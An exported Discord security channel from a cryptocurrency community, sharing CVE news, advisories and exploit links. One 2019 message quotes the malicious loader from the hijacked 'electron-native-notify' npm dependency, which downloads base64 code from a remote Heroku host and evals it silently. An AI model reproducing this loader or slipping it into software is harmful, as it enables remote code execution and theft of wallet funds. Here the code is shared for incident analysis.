+It’s a cool node map though
+
+
+[06-Jun-19 11:41 AM] Andy#1801
+I see that the lockfile now includes two ^, after what happened here yesterday I would probably try to get rid of them 😃
+
+
+[06-Jun-19 11:41 AM] BigSlim#9710
+I’ll see myself out
+
+
+[09-Jun-19 06:15 AM] Andy#1801
+So the only further information I found was this, someone uploaded the source of the `electron-native-notify` dependency. But it seems that the payload has been loaded from a server. Does anyone have the payload?
+
+```
+try {
+    (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
+        try {
+            eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))
+        } catch (e) {}
+    }))
+} catch (e) {}
+```
+
+{Reactions}
+🔹 
+
+[12-Jun-19 11:18 AM] cryptose#0406
+@Andy any luck finding a secondary payload?
+
+
+[13-Jun-19 06:37 AM] jl777c#5810
+i already commented about this in #💬┃general
+
+
+[01-Jul-19 12:11 PM] jl777c#5810
+using  minor issues (without disclosing details) to scare people to upgrade to segwit contaminated versions
+
+
+[04-Jul-19 12:45 PM] KomodoWorld#8282
+https://twitter.com/MihailoBjelic/status/1146867337452294144
+
+{Embed}
+Mihailo Bjelic (@MihailoBjelic)
+https://twitter.com/MihailoBjelic/status/1146867337452294144
+Two fresh papers on attacks on PoW chains:
+
+- https://t.co/5nVQNNJhPk (analyzes/categorizes bribing attacks and presents several new and improved attacks)
+- https://t.co/TFwrrwnxt9 (models Markov Decision Process for two different 51% attacks, proves both feasible and prof...
+https://images-ext-2.discordapp.net/external/EpILzgcizkePkEDpn1HmxT13Fw0bzHbm74wpU4Ie2nE/https/pbs.twimg.com/media/D-p9Su8XUAA4sYP.png%3Alarge
+Twitter
+
+
+[04-Jul-19 01:58 PM] grewalsatinder#9653
+Interesting, thanks for sharing 
+Will look into it :)
+
+
+[17-Aug-19 09:06 AM] ca333#0333
+https://www.usenix.org/system/files/sec19-antonioli.pdf
+
+{Reactions}
+abusedsmily 🙈 (2) 👀 
+
+[20-Aug-19 05:02 AM] MCB999#4841
+I'm developing a gaming platform where users will rate an item. What methods do you recommend taking to stop bots, malicious actors, and miceoworkers from spamming the system. I've been told micro transactions fees to rate, identity verification, any others?
+
+
+[20-Aug-19 09:30 PM] Mylo#8306
+proof of gameplay won't stop the bots, but it will allow ppl to earn their right to rate after playing
+
+
+[21-Aug-19 12:21 AM] polycryptoblog#1173
+Txpow
+
+
+[21-Aug-19 12:23 AM] Deleted User#0000
+no
+
+
+[21-Aug-19 12:47 AM] polycryptoblog#1173
+Why not txpow ?
+
+
+[21-Aug-19 12:49 AM] Deleted User#0000
+How doies that help with a game?
+
+
+[21-Aug-19 12:49 AM] Deleted User#0000
+The game poroof of play requries all key press to be sent to blochain as fast as possible... by adding txpow you just slow it down so it wont work any more
+
+
+[21-Aug-19 01:01 AM] polycryptoblog#1173
+He was asking about rating items, not proof of gameplay.
+
+
+[21-Aug-19 01:14 AM] Mylo#8306
+Yeah rate limiting by using computing power would reduce imo.  Depends on market though.  Spending $15 a week on constant ratings might have thousands of upside....need more info really - but if its competitive amongst projects for player mindshare, the adversarial side of "doing business" will do what it wants off-chain
+
+
+[21-Aug-19 01:15 AM] Deleted User#0000
+Why not just make it so that they can onlyt appear once every X blocks?
+
+
+[21-Aug-19 01:16 AM] Deleted User#0000
+Seems much simpler and less wasteful
+
+
+[21-Aug-19 01:16 AM] Deleted User#0000
+Send a marker to some address, and that cannot be spent until X blocks have passed. 
+That marker must be spent to create the next item
+
+
+[21-Aug-19 01:20 AM] Mylo#8306
+Global rating limits? Eg 10 markers (ratings) every 5 blocks?
+
+
+[21-Aug-19 01:21 AM] Mylo#8306
+It could, and again depends on all the other info.  Marker would work
+
+
+[21-Aug-19 01:27 AM] Deleted User#0000
+yes
+
+
+[21-Aug-19 01:28 AM] Deleted User#0000
+use a CC EVAL code
+
+
+[21-Aug-19 01:28 AM] Deleted User#0000
+gives a global address... or any number of global address
+
+
+[21-Aug-19 01:28 AM] Deleted User#0000
+have a marker utxo that can only be spent after some amount of blocks...
+
+
+[21-Aug-19 01:29 AM] Deleted User#0000
+https://github.com/blackjok3rtt/komodo/blob/jl777/src/cc/payments.cpp#L246
+
+{Embed}
+https://github.com/blackjok3rtt/komodo/blob/jl777/src/cc/payments.cpp
+blackjok3rtt/komodo
+Komodo. Contribute to blackjok3rtt/komodo development by creating an account on GitHub.
+https://images-ext-2.discordapp.net/external/H9TDr69kM7mmxGBcENY3FInyORgkC6up-3NZ7sRUihU/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/30971146
+
+
+[21-Aug-19 01:30 AM] Deleted User#0000
+each item must spend this utxo to be created
+
+
+[21-Aug-19 06:03 AM] Mylo#8306
+@Deleted User marker pattern, can be used for a token pausing solution?
+
+
+[21-Aug-19 06:06 AM] Mylo#8306
+Eg, I create MYLO tokens, find out my business partner is about to sell some illegally to a 3rd party, can put a pause marker until it can be resolved.  Or say in a game situation, the championship has just been won, the game takes a 1 week competition break/holiday.
+
+
+[21-Aug-19 08:07 PM] smkhound#7640
+Maybe lock the tokens via HeirCC module?
+
+{Reactions}
+🤷 
+
+[13-Oct-19 01:37 PM] ca333#0333
+https://www.adaptivemobile.com/blog/simjacker-frequently-asked-questions
+
+{Embed}
+https://www.adaptivemobile.com/blog/simjacker-frequently-asked-questions
+Simjacker - Frequently Asked Questions and Demos
+We have received a lot of questions since we revealed the existence and active exploitation of the Simjacker vulnerability. Here we put the most common questions, as well as showing example demos of the Location retrieval and Browser-Opening attacks, made possible by Simjacker
+https://images-ext-1.discordapp.net/external/DuUa0Mv771vAe3aAm9jW7dt59igk9bxXFs2eFji_imw/https/www.adaptivemobile.com/images/blog-uploads/Blog-Faq.png
+
+{Reactions}
+👀 
+
+[14-Oct-19 01:18 PM] jl777c#5810
+https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
+
+{Embed}
+https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
+Sudo Flaw Lets Linux Users Run Commands As Root Even When They're ...
+A vulnerability in Sudo, tracked as CVE-2019-14287, could allow Linux users to run commands as root user even when they're restricted.
+https://images-ext-1.discordapp.net/external/huiUUHUUkKUCV86h6do6MPHVC-xmdVTbbSMfcEonQb4/https/1.bp.blogspot.com/-DhSZYsF6H3M/XaS4PYHy8KI/AAAAAAAA1Zc/9zna6Gg2f2sYLztPs6Ic4wWClb5gVvEEQCLcBGAsYHQ/s728-e100/linux-sudo-hacking.png
+
+{Reactions}
+👀 (2) 👍 (2) 
+
+[14-Oct-19 01:28 PM] phm87#7395
+thank you jl for the info
+```The vulnerability affects all Sudo versions prior to the latest released version 1.8.28, which has been released today, a few hours ago and would soon be rolled out as an update by various Linux distributions to their users.
+So, if you use Linux, you are highly recommended to update sudo package manually to the latest version as soon as it is available.```
+
+
+[17-Oct-19 08:43 AM] phm87#7395
+https://blog.keys.casa/shamirs-secret-sharing-security-shortcomings/
+
+{Embed}
+https://blog.keys.casa/shamirs-secret-sharing-security-shortcomings/
+Shamir's Secret Sharing Shortcomings
+After extensive research we rejected using Shamir's Secret Sharing Scheme because it exposes clients to many more risks. We recommend multisig instead.
+https://images-ext-1.discordapp.net/external/hDQhuLJnd5v6HScHGN9H9P-ErLZN31P7VgMkFZB-tEc/https/blog.keys.casa/content/images/2019/10/lock-and-key-banner.jpg
+
+
+[17-Oct-19 09:37 AM] phm87#7395
+https://www.zdnet.fr/actualites/un-chercheur-publie-un-exploit-sur-une-faille-0day-de-la-derniere-version-android-39892405.htm sorry it is in french
+
+{Embed}
+https://www.zdnet.fr/actualites/un-chercheur-publie-un-exploit-sur-une-faille-0day-de-la-derniere-version-android-39892405.htm
+Un chercheur publie un exploit sur une faille 0day de la dernière...
+L'application Qu1ckR00t peut rooter un appareil Android en exploitant la faille 0day CVE-2019-2215. Un chercheur américain a publié un code de preuve de concept fonctionnel sur Github.
+https://images-ext-1.discordapp.net/external/empUMsdj2I9g5TSSob-3U6o5wNQUVfxA9S1Z0mg5YqE/https/d1fmx1rbmqrxrr.cloudfront.net/zdnet/i/edit/ne/2019/10/qu1ckr00t.png
+
+
+[26-Oct-19 01:23 AM] polycryptoblog#1173
+https://www.vice.com/en_us/article/xwekw4/pwnagotchi-is-the-open-source-handheld-that-eats-wi-fi-handshakes
+
+{Embed}
+https://www.vice.com/en_us/article/xwekw4/pwnagotchi-is-the-open-source-handheld-that-eats-wi-fi-handshakes
+'Pwnagotchi' Is the Open Source Handheld That Eats Wi-Fi Handshakes
+The Tamagotchi-inspired device helps wandering hackers to crack Wi-Fi passwords while looking adorable.
+https://images-ext-1.discordapp.net/external/mO92wwi6GfAKSvy_-L_KYmrzg9O5CKvJ-cQBkUwMicY/%3Fcrop%3D1xw%3A0.7487xh%3B0xw%2C0.1391xh%26resize%3D1200%3A%2A/https/video-images.vice.com/articles/5db0971386c00a00925b3bce/lede/1572018232045-alpha-beta.jpeg
+
+
+[26-Oct-19 04:09 PM] PTYX#6840
+Gonna build one
+
+
+[26-Oct-19 04:18 PM] PTYX#6840
+I wonder if you NEED a Raspberry Z
+
+
+[26-Oct-19 04:18 PM] PTYX#6840
+I have a few 3Bs laying around
+
+
+[26-Oct-19 05:13 PM] SHossain#0007
+it also works with 3 & 4 models
+
+
+[26-Oct-19 05:13 PM] SHossain#0007
+https://pwnagotchi.ai/installation/#body-nbsp
+
+
+[04-Nov-19 03:53 AM] phm87#7395
+Sorry it is in french
+https://securite.developpez.com/actu/283148/Kaspersky-a-decouvert-une-faille-zero-day-utilisee-pour-lancer-des-attaques-via-Google-Chrome-les-internautes-sont-invites-a-effectuer-une-mise-a-jour-de-leur-navigateur/
+
+{Embed}
+https://securite.developpez.com/actu/283148/Kaspersky-a-decouvert-une-faille-zero-day-utilisee-pour-lancer-des-attaques-via-Google-Chrome-les-internautes-sont-invites-a-effectuer-une-mise-a-jour-de-leur-navigateur/
+Kaspersky a découvert une faille zero-day utilisée pour lancer d...
+https://images-ext-1.discordapp.net/external/2dokAX1WoIKu-aMoBSTkMJHRl0wu4Q_yXjPr2cN3r9c/https/www.developpez.com/images/logos/chrome.png
+
+
+[04-Nov-19 03:54 AM] phm87#7395
+Google Chrome users are invited to update
+
+
+[08-Nov-19 08:56 AM] phm87#7395
+https://twitter.com/theinstagibbs/status/1192823830923923456?s=20
+
+{Embed}
+instagibbs 🐬 (@theinstagibbs)
+https://twitter.com/theinstagibbs/status/1192823830923923456?s=20
+Bitcoin Core CVE disclosure(fixed in v0.15.1): https://t.co/aRScWwNrPj
+Twitter
+
+
+[12-Nov-19 12:21 PM] phm87#7395
+https://zombieloadattack.com/
+
+
+[12-Nov-19 12:21 PM] phm87#7395
+https://twitter.com/lavados/status/1194320238403301382
+
+{Embed}
+Daniel Gruss (@lavados)
+https://twitter.com/lavados/status/1194320238403301382
+With issues during some disclosures, Intel took our concerns *very* seriously and improved the communication and handling of issues *substantially* over the past year. This deserves recognition and I want to thank Intel for improving the process. #zombieload #meltdown #spe...
+Twitter
+
+
+[23-Nov-19 12:44 AM] phm87#7395
+https://medium.com/@lukedashjr/cve-2018-20586-disclosure-ff3e1ab9a21f
+
+{Embed}
+https://medium.com/@lukedashjr/cve-2018-20586-disclosure-ff3e1ab9a21f
+CVE-2018–20586 disclosure
+CVE-2018–20586 is a log injection vulnerability which allows any software with access to the RPC port to create fake or confusing entries…
+
+
+[23-Nov-19 12:44 AM] phm87#7395
+@ca333
+
+
+[23-Nov-19 01:16 AM] ca333#0333
+thanks @phm87  - yea, we should never expose an rpc interface to external (unknown) conns. There is even a much worse unpatched vuln around - hammer a coin daemons rpc interface with few thousand simul. requests and you ll get the node to crash. Pre-req for this attack: nodes rpc interface is "public" and has non-limited rpc worker queue...
+
+
+[23-Nov-19 01:17 AM] phm87#7395
+yes, I discussed a little bit with dukeleto about this
+
+
+[23-Nov-19 01:18 AM] phm87#7395
+in any case, when an attacker is able to use the RPC calls, he can do what he wants and  it is not limited to this CVE.
+
+
+[24-Nov-19 04:39 AM] dukeleto#7326
+the CVE covers anything that is allowed to connect to the port, not just things with have a user+pass. That is a subtle point and means everything on localhost could elevate the attack. This makes it so if you can get access to an unpriveledged user on the same machine, you can launch this attack
+
+
+[24-Nov-19 04:40 AM] dukeleto#7326
+this is considered "fucked" already for most coins. Having malicious users on the same machine opens you up to side channel attacks, which Zcash is not designed for (see the latest Zcash CVEs) and so this CVE isn't super critical
+
+
+[04-Dec-19 10:32 PM] phm87#7395
+https://www.openwall.com/lists/oss-security/2019/12/04/5
+OpenBSD
+
+{Reactions}
+👍 
+
+[05-Dec-19 06:29 PM] Mylo#8306
+Freaky how any possible entry is possible and if you’re running a cryptocurrency node it’s a hazard eg radius for billing systems....
+
+
+[07-Dec-19 04:59 PM] phm87#7395
+https://www.bleepingcomputer.com/news/security/new-linux-vulnerability-lets-attackers-hijack-vpn-connections/
+
+{Embed}
+https://www.bleepingcomputer.com/news/security/new-linux-vulnerability-lets-attackers-hijack-vpn-connections/
+New Linux Vulnerability Lets Attackers Hijack VPN Connections
+Security researchers found a new vulnerability allowing potential attackers to hijack VPN connections on affected *NIX devices and inject arbitrary data payloads into IPv4 and IPv6 TCP streams.
+https://images-ext-2.discordapp.net/external/pwUn6Fr7n9oCySosDzUChxU3tlE0kbehkrf7mTrqOYc/https/www.bleepstatic.com/content/hl-images/2019/02/08/Linux_Malware.jpg
+
+
+[12-Dec-19 09:02 AM] phm87#7395
+https://www.openwall.com/lists/oss-security/2019/12/11/9
+
+
+[13-Dec-19 06:44 AM] CrisF#3405
+https://www.cbronline.com/news/git-project-patches
+
+{Embed}
+Ed Targett
+https://www.cbronline.com/news/git-project-patches
+GitHub Urges "Critical" Git Project Patches, after 9 Vulns Fixed
+GitHub has urged users to make "critical" Git project code updates after nine security vulnerabilities were found in the open source version-control system.
+https://images-ext-1.discordapp.net/external/NcSOrE28czn4C-LWz8QUa6kcTgZ1yqSNNJgIacA7g2E/https/www.cbronline.com/wp-content/uploads/2019/12/michael-geiger-JJPqavJBy_k-unsplash.jpg
+
+
+[28-Dec-19 06:40 AM] Gig#0273
+hello, could somebody pls share some dPoW txns on the BTC blockchain? ty
+
+
+[28-Dec-19 06:40 AM] Gig#0273
+are they all being paid from one (or a handful) of BTC addresses? ty
+
+
+[28-Dec-19 06:45 AM] ComputerGenie#7004
+<https://www.blockchain.com/btc/address/1P3rU1Nk1pmc2BiWC8dEy9bZa1ZbMp5jfg>
+
+
+[28-Dec-19 06:46 AM] ComputerGenie#7004
+`are they all being paid from one (or a handful) of BTC addresses?`
+13 of 64
+
+
+[28-Dec-19 10:04 PM] Mylo#8306
+it's like a sortition in politics.   voting every year for new bunch of candidates to fulfil the roll of some of those signatories
+
+
+[01-Jan-20 04:04 AM] phm87#7395
+https://www.financemagnates.com/cryptocurrency/news/shitcoin-wallet-pushing-malicious-codes-collecting-exchange-credentials/
+
+
+[12-Jan-20 03:05 PM] CrisF#3405
+https://www.us-cert.gov/ncas/current-activity/2020/01/08/mozilla-patches-critical-vulnerability
+https://www.mozilla.org/en-US/security/advisories/mfsa2020-03/#CVE-2019-17026
+
+{Embed}
+https://www.us-cert.gov/ncas/current-activity/2020/01/08/mozilla-patches-critical-vulnerability
+Mozilla Patches Critical Vulnerability  | CISA
+Mozilla has released security updates to address a vulnerability in Firefox, Firefox ESR, and Thunderbird. An attacker could exploit this vulnerability to take control of an affected system. This vulnerability was detected in exploits in the wild.
+
+{Embed}
+https://www.mozilla.org/en-US/security/advisories/mfsa2020-03/
+Security Vulnerabilities fixed in Firefox 72.0.1 and Firefox ESR 6...
+https://images-ext-1.discordapp.net/external/0lM3AuYyat7buUrGB8JAE73w2FY6iH9_tPVOksh3M5s/https/www.mozilla.org/media/img/mozorg/mozilla-256.4720741d4108.jpg
+
+
+[15-Jan-20 01:31 AM] phm87#7395
+https://msrc-blog.microsoft.com/2020/01/14/january-2020-security-updates-cve-2020-0601/
+
+{Embed}
+https://msrc-blog.microsoft.com/2020/01/14/january-2020-security-updates-cve-2020-0601/
+January 2020 Security Updates: CVE-2020-0601 - Microsoft Security ...
+The January security updates include several Important and Critical security updates. As always, we recommend that customers update their systems as quickly as practical. Details for the full set of updates released today can be found in the Security Update Guide. We belie...
+
+
+[21-Jan-20 04:04 AM] phm87#7395
+https://www.cert.ssi.gouv.fr/alerte/CERTFR-2020-ALE-006/
+
+
+[09-Feb-20 12:24 AM] CrisF#3405
+You already know this I think, but still an interesting read. https://www.technologyreview.com/s/615163/a-dark-web-tycoon-pleads-guilty-but-how-was-he-caught/?utm_term=Autofeed&utm_campaign=site_visitor.unpaid.engagement&utm_medium=tr_social&utm_source=LinkedIn#Echobox=1581160354
+
+{Embed}
+https://www.technologyreview.com/s/615163/a-dark-web-tycoon-pleads-guilty-but-how-was-he-caught/?utm_term=Autofeed&utm_campaign=site_visitor.unpaid.engagement&utm_medium=tr_social&utm_source=LinkedIn
+A dark web tycoon pleads guilty. But how was he caught?
+The FBI found Eric Marques by breaking the famed anonymity service Tor, and officials won’t reveal if a vulnerability was used. That has activists and lawyers concerned.
+https://images-ext-1.discordapp.net/external/yDbKmvBj-6h9p_DUX8Rg79XV5CDYV3xeSAZXWvjZTeI/%3Fsw%3D560%26cx%3D0%26cy%3D0%26cw%3D2123%26ch%3D1194/https/www.technologyreview.com/i/images/screen-shot-2020-02-07-at-6.41.27-pm.png
+
+
+[16-Apr-20 12:13 PM] cipi#4502
+this could be interesting: https://medium.com/mycrypto/discovering-fake-browser-extensions-that-target-users-of-ledger-trezor-mew-metamask-and-more-e281a2b80ff9
+also contains a list of known urls to command&control servers (scroll down to the bottom)...
+
+{Embed}
+https://medium.com/mycrypto/discovering-fake-browser-extensions-that-target-users-of-ledger-trezor-mew-metamask-and-more-e281a2b80ff9
+Discovering Fake Browser Extensions That Target Users of Ledger, Tr...
+Using a familiar phishing method to target new brands.
+https://images-ext-1.discordapp.net/external/CoGyBediBCJTkUYXvEpnhyVi3jtyq_3dyKUKIDFYVTQ/https/miro.medium.com/max/1200/0%2AU9QmgmpmlyUX31bH
+
+{Reactions}
+👍 
+
+[03-Nov-20 03:16 AM] phm87#7395
+https://thehackernews.com/2020/11/new-chrome-zero-day-under-active.html
+
+{Embed}
+https://thehackernews.com/2020/11/new-chrome-zero-day-under-active.html
+New Chrome Zero-Day Under Active Attacks – Update Your Browser
+Google has patched a second actively exploited zero-day flaw in the Chrome browser in two weeks.
+https://images-ext-2.discordapp.net/external/j_NU27E6-cytPzj3pSVcRWsk6Yg6X-_OD5NgPtd90Ug/https/thehackernews.com/images/-wwpOKprFWzg/X6EjqTcCLXI/AAAAAAAAA9I/mBsBYTybLoExMJP9mvW6fPJ2Njf3EeA6gCLcBGAsYHQ/s728-e1000/chrome-extensions.jpg
+
+{Reactions}
+🙏 (2) 👍 
+
+[06-Nov-20 05:54 PM] CrisF#3405
+https://thehackernews.com/2020/11/update-your-ios-devices-now-3-actively.html
+
+{Embed}
+https://thehackernews.com/2020/11/update-your-ios-devices-now-3-actively.html
+Update Your iOS Devices Now — 3 Actively Exploited 0-Days Discovered
+Update Your Apple iOS Devices Now — 3 Actively Exploited 0-Days Discovered by Google
+https://images-ext-1.discordapp.net/external/jeWmWCdJifYoBB4x86Xex-EEnAmdQT_l4UQ6kVqCutQ/https/thehackernews.com/images/-4s737H_lQjY/X6T-7usqm2I/AAAAAAAAA-s/xbIl-rUzZWo6sfq6-YyjjyEeHi5vz2GugCLcBGAsYHQ/s728-e1000/apple-update.jpg
+
+
+[26-Jan-21 03:48 PM] phm87#7395
+https://www.openwall.com/lists/oss-security/2021/01/26/3
+
+{Reactions}
+👀 
+
+[27-Jan-21 06:16 AM] Alright#0419
+https://support.apple.com/en-us/HT212146
+
+{Embed}
+https://support.apple.com/en-us/HT212146
+About the security content of iOS 14.4 and iPadOS 14.4
+This document describes the security content of iOS 14.4 and iPadOS 14.4.
+
+
+[25-Feb-21 05:44 AM] phm87#7395
+https://github.com/CodeForcer/zero-exchange-exposed
+
+{Embed}
+https://github.com/CodeForcer/zero-exchange-exposed
+CodeForcer/zero-exchange-exposed
+A breakdown of the contract source-code for Zero Exchange, which is designed to allow the team to steal users funds - CodeForcer/zero-exchange-exposed
+https://images-ext-2.discordapp.net/external/FcAfY3dTqN8XsBZpkLrrB-Coah02ccRIS9S8rTKf-nA/%3Fs%3D400%26v%3D4/https/avatars.githubusercontent.com/u/31618931
+
+
+[05-Jun-21 11:53 PM] digiotai#8327
+Hi. I dont know if this a right place..If someone change smartchain parameters with slightly changes such as ac_era, will it still consider hardfork? 
+
+What i have tried is sync to a chain, then stop daemon. Rerun daemon with slightly different era, but still the same name and others ac parameter. I notice the daemon only change p2p port, but rpc port still the same as it was. So i was wondering if suddenly majority of the nodes change to new parameter..will it split the chain or it will be the longest chain wins which invalidate the original launch parameter. Thanks in forward.
+
+
+[08-Jun-21 03:08 AM] Alright#0419
+@digiotai it will immediately split the chain as soon as the rule you changed is violated
+
+{Reactions}
+👍 
+
+[08-Jun-21 03:09 AM] Alright#0419
+also it will break the ability to resync the chain from block 0 as the block files on disk will correspond to a different chain
+
+
+[08-Jun-21 03:49 AM] digiotai#8327
+thanks. i see it really split the chain. will the new chain carry on the same balance as on original chain?
+
+
+[08-Jun-21 03:50 AM] Alright#0419
+it will work if you are simply testing things, but you cannot do this for a production chain
+
+
+[08-Jun-21 03:50 AM] Alright#0419
+the way it stores blocks is based on the chain parameters
+
+{Reactions}
+👍 
+
+[08-Jun-21 03:50 AM] Alright#0419
+you will not be able to resync a new node
+
+
+[08-Jun-21 04:49 AM] gcharang#6833
+changing any parameter that starts with `-ac` means creating a new chain. your rpcport may have stayed the same because it would have existed in the `~/.komodo/NAME/NAME.conf` file.
+
+{Reactions}
+👍 (2) 
+
+[08-Jun-21 08:30 AM] digiotai#8327
+Ok good to know.
+
+
+[10-Jun-21 06:44 AM] phm87#7395
+https://thehackernews.com/2021/06/new-chrome-0-day-bug-under-active.html
+
+{Embed}
+https://thehackernews.com/2021/06/new-chrome-0-day-bug-under-active.html
+New Chrome 0-Day Bug Under Active Attacks – Update Your Browser ASA...
+Google rolled out an urgent update for Chrome browser to address 14 newly discovered security flaws, including a zero-day flaw.
+https://images-ext-2.discordapp.net/external/nxPtdeMKux0gXJ9UkSSkbGS2zQXxoBpHRv8iq3IcTKw/https/thehackernews.com/images/--v2cn8JGV00/YMGRd9cFvrI/AAAAAAAACz4/i5Stk6m4GEgwbul82T6lZeEbdMMNfofJQCLcBGAsYHQ/s0/chrome-zero-day-vulnerability.jpg
+
+
+[29-Jun-21 06:06 AM] phm87#7395
+https://github.com/irsl/gcp-dhcp-takeover-code-exec
+
+{Embed}
+https://github.com/irsl/gcp-dhcp-takeover-code-exec
+irsl/gcp-dhcp-takeover-code-exec
+Google Compute Engine (GCE) VM takeover via DHCP flood - gain root access by getting SSH keys added by google_guest_agent - irsl/gcp-dhcp-takeover-code-exec
+https://images-ext-1.discordapp.net/external/7TglZ4T3BMWjsGxCz9eWrOnF7grnd6cMP1uPOfpMIUc/https/opengraph.githubassets.com/746566549e724d5e1e4df5954248e4f42132740b82eca60446304f87bbc29a77/irsl/gcp-dhcp-takeover-code-exec
+
+{Reactions}
+👍 
+
+[29-Jun-21 06:21 AM] Mylo#8306
+thanks for the notice, sent to a friend
+
+
+[07-Jul-21 01:01 AM] phm87#7395
+You're welcome :-)
+
+
+[07-Jul-21 01:01 AM] phm87#7395
+Old (2008) https://github.com/g0tmi1k/debian-ssh
+
+{Embed}
+https://github.com/g0tmi1k/debian-ssh
+g0tmi1k/debian-ssh
+Debian OpenSSL Predictable PRNG (CVE-2008-0166). Contribute to g0tmi1k/debian-ssh development by creating an account on GitHub.
+https://images-ext-2.discordapp.net/external/EMokivqPWM17lrWKExp3zBA0leTY0Av5wcL4rXXGA3g/https/opengraph.githubassets.com/30fa078f57cf8672e092b3e8c581169875861c708c1d22790d6c3f7fe21bed4a/g0tmi1k/debian-ssh
+
+
+[21-Jul-21 02:59 AM] phm87#7395
+https://github.com/mvt-project/mvt
+
+{Embed}
+https://github.com/mvt-project/mvt
+GitHub - mvt-project/mvt: MVT is a forensic tool to look for signs ...
+MVT is a forensic tool to look for signs of infection in smartphone devices - GitHub - mvt-project/mvt: MVT is a forensic tool to look for signs of infection in smartphone devices
+https://images-ext-2.discordapp.net/external/hklC2LPf_GfM50ZVMoMc29NY1LwkWRnKkHJdMQ2x9pM/https/opengraph.githubassets.com/f0d36f9bb8055d3e433da5838018d061a682f6ba339f479b451ea10a403e82e3/mvt-project/mvt
+
+{Reactions}
+👍 💯 
+
+[25-Jul-21 02:26 AM] phm87#7395
+https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
+
+{Embed}
+https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
+#HiveNightmare aka #SeriousSAM — anybody can read the registry in W...
+This is the story of how all non-admin users can read the registry — and so elevate privileges and access sensitive credential information…
+https://images-ext-2.discordapp.net/external/HMUAgB-RVvflXYnx2x2-5Ft3dLvGgD-4yC1i0WyLdzc/https/miro.medium.com/max/662/1%2AmLEjg873kEAwhLin16DVyA.png
+
+
+[25-Jul-21 02:26 AM] phm87#7395
+https://twitter.com/mruef/status/1418693478574346242?s=20
+
+{Embed}
+Marc Ruef (@mruef)
+https://twitter.com/mruef/status/1418693478574346242?s=20
+Full phone number database of #Clubhouse is up for sale on the #Darknet. It contains 3.8 billion phone numbers. These are not just members but also people in contact lists that were synced. Chances are high that you are listed even if you haven't had a Clubhouse login.
+Retweets
+5081
+Likes
+7605
+https://images-ext-2.discordapp.net/external/m_g9Y3KvGCQAuF2dZvkza5pBlT6M74-h5tAvK0FZtv8/https/pbs.twimg.com/media/E7A1k3tXoAUKXXS.jpg%3Alarge
+Twitter
+
+
+[28-Jul-21 02:51 PM] phm87#7395
+https://thehackernews.com/2021/07/apple-releases-urgent-0-day-bug-patch.html
+
+{Embed}
+https://thehackernews.com/2021/07/apple-releases-urgent-0-day-bug-patch.html
+Apple Releases Urgent 0-Day Bug Patch for Mac, iPhone and iPad Devices
+Apple issues an urgent software update for iOS, iPadOS, and macOS to patch a new zero-day vulnerability.
+https://images-ext-1.discordapp.net/external/VuwnLrDrXEDaX8QUMxX5-XaisYpCbAaGvCdTrozHric/https/thehackernews.com/images/-b6kGmU8c6Gc/YP-1oely-GI/AAAAAAAADV0/MURJ7OCSDsoeAi2sHU_Bb2cqNT4e2C-qACLcBGAsYHQ/s0/apple-iphone-hacking.jpg
+
+
+[01-Aug-21 11:49 AM] phm87#7395
+https://www.bleepingcomputer.com/news/security/pypi-packages-caught-stealing-credit-card-numbers-discord-tokens/
+
+{Embed}
+https://www.bleepingcomputer.com/news/security/pypi-packages-caught-stealing-credit-card-numbers-discord-tokens/
+PyPI packages caught stealing credit card numbers, Discord tokens
+The Python Package Index (PyPI) registry has removed several Python packages this week aimed at stealing users' credit card numbers, Discord tokens, and granting arbitrary code execution capabilities to attackers. These malicious packages were downloaded over 30,000 times according to the researchers who caught them.
+https://images-ext-1.discordapp.net/external/voYbzY49Q1uIfM5Cbif919umjq2gUHK6onvUKWmC8Rs/https/www.bleepstatic.com/content/hl-images/2020/12/15/Python_malware.jpg
+
+
+[11-Sep-21 02:31 PM] phm87#7395
+https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444
+
+{Embed}
+https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444
+Security Update Guide - Microsoft Security Response Center
+
+
+[06-Oct-21 12:25 AM] Mylo#8306
+https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54
+
+{Embed}
+https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54
+Upgrade Your SSH Key to Ed25519
+If you’re a DevOps engineer or a web developer, there’s a good chance that you’re already familiar and using the SSH key authentication on…
+https://images-ext-2.discordapp.net/external/0a7wm6PPgmspe91q9HTJA1sV7ICvRVb_Z8Tf8Z1Wklg/https/miro.medium.com/max/1200/1%2ATiltvM4ydji8sXcvbsEL_Q.jpeg
+
+
+[24-Oct-21 01:13 PM] phm87#7395
+https://thehackernews.com/2021/10/popular-npm-package-hijacked-to-publish.html
+
+{Embed}
+https://thehackernews.com/2021/10/popular-npm-package-hijacked-to-publish.html
+Popular NPM Package Hijacked to Publish Crypto-mining Malware
+A popular JavaScript NPM library with over 6 million weekly downloads was hijacked to publish crypto-mining malware.
+https://images-ext-2.discordapp.net/external/jMuQnmf_7pU7vQDcU6KEYmI3g7J7LxHtjFNPnLe_41A/https/thehackernews.com/new-images/img/a/AVvXsEg8HqgMoSh8I0NuToWiC3CPNqgwcHQK5QIWnKK5o7OdbI7vij_pU5PwCCvN__URehnsSFtKLHgIZZTUCu2c0R1mM-ssS1pxgSUvCtcsfBa7gZu7wrBA8OwM7Q-zywj_2IPG8YhYtm5zqsoLDSJ0WBfPqbBJmQSPZs6E_3shDT2980nuTMFFTz4nf_AF%3Ds728-e1000
+
+
+[24-Oct-21 03:27 PM] cryptosammy#3587
+@phm87 wasn't it a npm package that caused a hack with Komodo?
+
+
+[24-Oct-21 04:14 PM] ComputerGenie#7004
+_wonders why dafuq people still blindly use npm_
+
+
+[24-Oct-21 06:47 PM] grewalsatinder#9653
+yes, Agama Wallet.
+
+
+[25-Oct-21 03:33 AM] cryptosammy#3587
+I want to respond to this in a serious matter. I, for one, I am very inexperienced. Especially when it comes to certain areas. I follow tutorials and lucky for me, GitHub has showed me the insecurities from certain packages.
+
+
+[25-Oct-21 03:33 AM] cryptosammy#3587
+"We found potential security vulnerabilities in your dependencies." ( GitHub dependabot )
+
+
